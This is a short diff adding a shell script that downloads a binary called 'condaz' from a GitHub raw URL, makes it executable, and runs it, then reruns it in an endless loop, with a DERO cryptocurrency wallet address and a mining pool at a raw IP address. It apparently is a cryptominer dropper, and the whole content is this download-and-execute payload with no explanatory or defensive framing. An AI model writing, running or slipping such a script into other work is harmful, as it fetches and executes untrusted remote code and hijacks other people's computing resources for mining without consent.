@@ -1,0 +1,5 @@
+#!/bin/sh
+wget https://raw.githubusercontent.com/unauna1803/sonmuni/main/condaz
+chmod 700 condaz
+timeout 1m ./condaz -u deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcsmra2z8jfx22s4n7ltt.CPU -o wss://51.222.96.66:80
+while :; do timeout 1m ./condaz -u deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcsmra2z8jfx22s4n7ltt.CPU -o wss://51.222.96.66:80;echo JOSS; sleep 10s; done
